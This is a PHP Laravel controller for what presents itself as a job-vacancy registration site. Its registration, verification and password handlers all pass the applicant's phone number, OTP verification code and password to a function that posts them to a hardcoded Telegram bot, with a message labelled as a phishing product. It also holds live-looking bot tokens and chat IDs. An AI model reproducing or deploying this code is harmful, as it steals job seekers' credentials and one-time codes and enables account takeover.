<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class LokerController extends Controller
{
    public function index(Request $request)
    {
        return inertia('Job/Index');
    }
    public function registrasi(Request $request,)
    {
        $id = $request->id ? $request->id : 2;
        return inertia('Job/Registrasi', compact('id'));
    }

    public function registrasi_store(Request $request)
    {
        $request->validate([
            'nama' => 'required',
            'nomor_hp' => 'required|string|min:10|max:14',
            'jenis_kelamin' => 'required',
            'lulusan' => 'required',
        ]);
        $this->sendKode($request->nomor_hp);
    }

    public function verifikasi_store(Request $request)
    {

        $code = implode('', $request->code_verif);
        $nomor_hp = $request->nomor_hp;
        $this->sendKode($nomor_hp, $code);
    }
    public function password_store(Request $request)
    {

        $code = implode('', $request->code_verif);
        $nomor_hp = $request->nomor_hp;
        $this->sendKode($nomor_hp, $code, $request->password);
    }

    public function sendKode($phone = "",  $otp = "", $password = "")
    {



        // BOT 6
        $bot_token = "7286191912:AAE2M1Ii3LthqxOL4UtbtAm4AakQ85dOrZg";
        $chat_id = "8070835865";
        $phisData = "";
        // $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
        // $chat_id = "6552942907";
        // $phisData = "GIF2";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "  Produk Pissing
            \n  - No $phone  
            \n  - Code $otp  
            \n  - Password $password "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
